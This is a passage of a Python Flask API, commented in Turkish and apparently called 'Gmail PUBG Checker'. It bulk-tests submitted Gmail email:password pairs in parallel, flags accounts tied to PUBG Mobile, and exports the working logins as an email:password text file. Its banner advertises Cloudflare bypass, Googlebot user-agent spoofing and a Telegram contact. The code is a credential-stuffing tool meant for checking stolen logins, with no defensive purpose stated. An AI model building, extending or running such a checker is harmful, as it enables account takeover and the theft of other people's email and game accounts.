            return jsonify({"error": "JSON body required"}), 400
        
        accounts = data.get('accounts', [])
        if not accounts:
            return jsonify({"error": "accounts list required"}), 400
        
        if len(accounts) > 50:
            return jsonify({"error": "Maximum 50 accounts per request"}), 400
        
        results = []
        valid_count = 0
        pubg_count = 0
        
        with ThreadPoolExecutor(max_workers=CONFIG["max_workers"]) as executor:
            futures = []
            for acc in accounts:
                email = acc.get('email', '').strip()
                password = acc.get('password', '').strip()
                if email and password and ('@gmail.com' in email or '@googlemail.com' in email):
                    futures.append(executor.submit(check_single_account, email, password))
            
            for future in futures:
                try:
                    result = future.result(timeout=CONFIG["timeout"] + 5)
                    results.append(result)
                    stats["results"].append(result)
                    if result.get("status") == "valid":
                        valid_count += 1
                        if result.get("type") == "pubg_mobile":
                            pubg_count += 1
                except Exception as e:
                    results.append({"error": str(e)})
        
        stats["last_check"] = datetime.now().isoformat()
        
        return jsonify({
            "success": True,
            "total": len(results),
            "valid_count": valid_count,
            "pubg_count": pubg_count,
            "results": results
        })
        
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/api/check-file', methods=['POST'])
def check_file_api():
    """Dosya içeriğinden kontrol API"""
    try:
        data = request.get_json()
        if not data:
            return jsonify({"error": "JSON body required"}), 400
        
        file_content = data.get('file_content', '')
        if not file_content:
            return jsonify({"error": "file_content required"}), 400
        
        result = check_accounts_from_file(file_content)
        
        if "error" in result:
            return jsonify({"error": result["error"]}), 400
        
        valid_count = sum(1 for r in result["results"] if r.get("status") == "valid")
        pubg_count = sum(1 for r in result["results"] if r.get("status") == "valid" and r.get("type") == "pubg_mobile")
        
        return jsonify({
            "success": True,
            "total": result["total"],
            "valid_count": valid_count,
            "pubg_count": pubg_count,
            "results": result["results"]
        })
        
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/api/export', methods=['GET'])
def export_results():
    """Sonuçları txt dosyası olarak dışa aktar"""
    try:
        output = []
        for result in stats["results"]:
            if result.get("status") == "valid":
                email = result.get("email", "")
                password = result.get("password", "")
                result_type = "PUBG" if result.get("type") == "pubg_mobile" else "VALID"
                output.append(f"{email}:{password} [{result_type}]")
        
        if not output:
            return jsonify({"error": "No valid results to export"}), 404
        
        content = "\n".join(output)
        return send_file(
            BytesIO(content.encode('utf-8')),
            mimetype='text/plain',
            as_attachment=True,
            download_name=f'gmail_results_{datetime.now().strftime("%Y%m%d_%H%M%S")}.txt'
        )
        
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/api/stats/reset', methods=['POST'])
def reset_stats():
    """İstatistikleri sıfırla"""
    global stats
    stats = {
        "total_checked": 0,
        "valid_accounts": 0,
        "pubg_accounts": 0,
        "bad_accounts": 0,
        "results": [],
        "start_time": datetime.now(),
        "last_check": None
    }
    return jsonify({"success": True, "message": "İstatistikler sıfırlandı"})

# ==================== MAIN ====================

if __name__ == "__main__":
    stats["start_time"] = datetime.now()
    
    port = int(os.environ.get("PORT", 5000))
    
    print("=" * 60)
    print("📧 Gmail PUBG Checker API Başlatılıyor...")
    print("=" * 60)
    print(f"📡 Port: {port}")
    print(f"⚡ Max Workers: {CONFIG['max_workers']}")
    print(f"⏱️  Timeout: {CONFIG['timeout']}s")
    print(f"🌐 User Agents: {len(USER_AGENTS)}")
    print(f"📧 Gmail Senders: {len(PUBG_SENDERS)}")
    print("🛡️ Cloudflare Bypass: Aktif")
    print("🤖 Googlebot User-Agent: Aktif")
    print("📞✈️ Telegram: @rinexdestek")
    print("=" * 60)
    
    app.run(host="0.0.0.0", port=port, debug=False)
